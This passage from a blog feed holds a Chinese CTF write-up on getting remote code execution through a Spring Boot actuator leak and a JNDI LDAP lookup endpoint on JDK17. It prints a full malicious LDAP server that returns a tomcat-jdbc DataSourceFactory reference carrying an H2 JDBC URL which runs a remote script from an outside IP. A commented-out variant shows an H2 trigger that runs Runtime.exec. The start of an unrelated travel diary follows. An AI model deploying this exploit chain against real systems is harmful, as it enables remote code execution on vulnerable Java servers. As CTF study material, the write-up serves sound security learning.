plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;_links&quot;: &#123;</span><br><span class="line">    &quot;self&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;beans&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/beans&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;caches&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/caches&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;caches-cache&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/caches/&#123;cache&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;health-path&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/health/&#123;*path&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;health&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/health&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/info&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;conditions&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/conditions&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;configprops&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/configprops&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;configprops-prefix&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/configprops/&#123;prefix&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;env-toMatch&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/env/&#123;toMatch&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;env&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/env&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;loggers-name&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/loggers/&#123;name&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;loggers&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/loggers&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;heapdump&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/heapdump&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;threaddump&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/threaddump&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;metrics&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/metrics&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;metrics-requiredMetricName&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/metrics/&#123;requiredMetricName&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;scheduledtasks&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/scheduledtasks&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/mappings&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看 mappings 发现 source 端点<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494180-65e029cd-6203-4ff9-a58e-0f2ee3616e12.png#averageHue=%23dbdbdb&clientId=u3af23d66-84b5-4&from=paste&id=u74ecfa69&originHeight=870&originWidth=1824&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0569bb11-ecd8-4a50-b54f-95e6ece3db7&title="><br>源码泄露路由</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/lookup&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String path)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://&quot;</span> + path;</span><br><span class="line">    <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    initialContext.lookup(url);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (NamingException e)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且题目的环境是jdk17，这里就涉及到一个JDK17环境下的Ldap打法，我们先尽可能的搜集信息。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494270-9a7fa3be-5e8f-471a-8c87-5ad9aec3e0ee.png#averageHue=%231a1a1a&clientId=u3af23d66-84b5-4&from=paste&id=u9332ec2c&originHeight=442&originWidth=1386&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u1b0938d8-5480-45ed-bf71-2d2ada584c6&title="><br>configprops根据hint去搜索pool，就只能看到Tomcat Connection，这里fuzz了一波发现是tomcat-jdbc依赖。我们可以配合h2去打一个rce就好。但是我们还需要注意一个东西<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494156-213f47c3-807b-4af3-a80d-7386f6dae7a9.png#averageHue=%23121212&clientId=u3af23d66-84b5-4&from=paste&id=u0e0a4c25&originHeight=312&originWidth=1504&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u85049624-015a-468d-aa97-4e606a0655f&title="><br>trustSerialData为false<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494193-fa5e3a5c-24aa-45d3-bf7f-75dc953b7efd.png#averageHue=%23212225&clientId=u3af23d66-84b5-4&from=paste&id=ud71eb862&originHeight=1378&originWidth=2124&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u7ea18a26-87c3-41ad-b7f9-f564c2e6602&title="><br>那么就说明我们无法走ldap的deserialization路线，只能选择走下面的decodeRefence去配合ObjectFacotry打一个组合拳。而我们想走decodeRefence就需要设置javaNamingRefence<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494687-238b8da9-46f9-4d12-ad24-5ce65e0b4dcc.png#averageHue=%235c9165&clientId=u3af23d66-84b5-4&from=paste&id=uf7fb2f44&originHeight=152&originWidth=1582&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uaa51c452-08b7-4cfa-9d7a-3da66ae7be2&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494799-a2abf384-03bc-4b9f-be06-5289113d9964.png#averageHue=%23272a2f&clientId=u3af23d66-84b5-4&from=paste&id=u6680a1dc&originHeight=1386&originWidth=2776&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u81e54ec6-f1dd-40f8-95d0-1b647d4639a&title="><br>我们成功的进入了decodeReference，在这里我们会对我们传入的attrs做一个处理，去new一个Reference对象<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494861-1cd2c301-fccf-45ca-96e9-c6beb1cbd6a2.png#averageHue=%23282b2f&clientId=u3af23d66-84b5-4&from=paste&id=ue7ef52c8&originHeight=1338&originWidth=3166&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ufbd6c9fe-3839-4b03-80de-7467cd49aff&title="><br>我们选择我们的组合拳套餐。我们配合tomcat-jdbc去打h2，但这里还有个问题就是指定h2的jdbcUrl，这里我们需要利用到另一个变量<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494947-03fc907f-b608-4453-b54f-e739a161e605.png#averageHue=%2324272d&clientId=u3af23d66-84b5-4&from=paste&id=uba74b391&originHeight=1332&originWidth=2710&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uceadbb65-bc2a-4db6-bb94-a8dcaa01206&title="><br>javaReferenceAddr，我们会取ldapserver给的这个值，然后对他做一个分隔处理。可以看到上图中用@隔开了变量名和值，传入了url为恶意的jdbc字符串。随之我们就会进入DatasourceFactory#getObjectInstance<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494891-2e1f5228-91f1-4e2c-a315-b446442b3207.png#averageHue=%2327292e&clientId=u3af23d66-84b5-4&from=paste&id=u388de097&originHeight=1458&originWidth=2904&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0a8485d7-86b9-4c08-8b62-3fe707b5e68&title="><br>最终发起H2连接RCE。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734495204-015ec5d0-1923-4630-8a11-0ec8d4fb4a43.png#averageHue=%232c2e39&clientId=u3af23d66-84b5-4&from=paste&id=u9853abf5&originHeight=1672&originWidth=2632&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u402c7d1b-b58a-4615-8d74-116c566b23e&title="><br>恶意LdapServer如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HackerLDAPRefServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lanuchLDAPServer</span><span class="params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    ldap_port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://&quot;</span>+http_server+<span class="string">&quot;:&quot;</span>+http_port+<span class="string">&quot;/#org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + ldap_port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;javax.sql.DataSource&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            Reference ref = new Reference(&quot;javax.sql.DataSource&quot;,&quot;com.zaxxer.hikari.HikariJNDIFactory&quot;,null);</span></span><br><span class="line"><span class="comment">//            String url = &quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://8.130.24.188:7791/poc.sql&#x27;&quot;;</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;driverClassName&quot;,&quot;org.h2.Driver&quot;));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;jdbcUrl&quot;,url));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;username&quot;,&quot;root&quot;));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;password&quot;,&quot;password&quot;));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;initialSize&quot;,&quot;1&quot;));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaSerializedData&quot;, Base64.getDecoder().decode( SerializeUtils.base64serial(ref)));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/** Payload1: Return Reference Factory **/</span></span><br><span class="line">             e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">             e.addAttribute(<span class="string">&quot;javaReferenceAddress&quot;</span>, <span class="string">&quot;@0@url@jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://8.130.24.188:7791/poc.sql&#x27;&quot;</span>);</span><br><span class="line"><span class="comment">//             e.addAttribute(&quot;javaReferenceAddress&quot;, &quot;@0@url@jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\nINFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;open /&#x27;)\n$$\n&quot;);</span></span><br><span class="line">             e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">             e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://8.130.24.188:7791/poc.sql&#x27;&quot;</span>;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;jdbcUrl&quot;</span>,url);</span><br><span class="line">            <span class="comment">/** Payload1 end **/</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/** Payload2: Return Serialized Gadget **/</span></span><br><span class="line"><span class="comment">//            try &#123;</span></span><br><span class="line"><span class="comment">//                // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;|base64</span></span><br><span class="line"><span class="comment">//                e.addAttribute(&quot;javaSerializedData&quot;,Base64.decode(&quot;&quot;));</span></span><br><span class="line"><span class="comment">//            &#125; catch (ParseException e1) &#123;</span></span><br><span class="line"><span class="comment">//                e1.printStackTrace();</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="comment">/** Payload2 end **/</span></span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerAddress: &quot;+args[0]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerPort: &quot;+args[1]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;LDAPServerPort: &quot;+args[2]);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">http_server_ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ldap_port</span> <span class="operator">=</span> <span class="number">8089</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">http_server_port</span> <span class="operator">=</span> <span class="number">8001</span>;</span><br><span class="line"></span><br><span class="line">        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);</span><br><span class="line">        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">大伙儿都太厉害了</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="WriteUp" scheme="http://boogipop.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>真夜中のドア - ShangHai(1)</title>
    <link href="http://boogipop.com/2024/05/25/%E7%9C%9F%E5%A4%9C%E4%B8%AD%E7%9A%84%E4%B8%8A%E6%B5%B71/"/>
    <id>http://boogipop.com/2024/05/25/%E7%9C%9F%E5%A4%9C%E4%B8%AD%E7%9A%84%E4%B8%8A%E6%B5%B71/</id>
    <published>2024-05-25T10:04:17.007Z</published>
    <updated>2024-05-25T10:07:56.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="四月三十号-这可真是一场酣畅淋漓的赤石"><a href="#四月三十号-这可真是一场酣畅淋漓的赤石" class="headerlink" title="四月三十号 | 这可真是一场酣畅淋漓的赤石"></a>四月三十号 | 这可真是一场酣畅淋漓的赤石</h1><p>年轻的我在半个月前就把飞机票早早的买好了，但是年轻的我没想到不久的将来将被海南航空折磨的死去火来</p><blockquote><p>你说的对，海南航空作为中国内地第一家也是唯一一家SKYTRAX五星航空公司，凭借优质的服务水平和产品获得“SKYTRAX五星航空公司”称号，这是海南航空自2011年起第十二次蝉联该荣誉。而在这个过程中，你将扮演一名候机员，等待坐上飞机的驾驶位，并在这个过程中不断地发现海南航空的秘密。</p></blockquote><p>虽然现在已经五月末了，才开始叙述起月初的事情，这才叫做赛博回忆录嘛。<br>4.30号，年轻的pop在早早的下午一点就到达了机场，但是海南航空总是不出意外的出意外了。<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716629695030-f578da6f-b783-4cd0-aa02-87cbc003ecf6.jpeg#averageHue=%23e7f4e7&clientId=u40b8badd-7d31-4&from=paste&height=960&id=u830a30cd&originHeight=1920&originWidth=863&originalType=binary&ratio=2&rotation=0&showTitle=false&size=115850&status=done&style=none&taskId=u3ef814cf-e0b3-4798-bdc9-aac173efb13&title=&width=431.5" alt="88fec482b4d277fe1c6ae8efa7d9bffd_720.jpg"><br>从一张图里可以读出千言万语，最终飞机在晚上七点成功起飞🎉🎉<br>（飞机起飞）<br><img 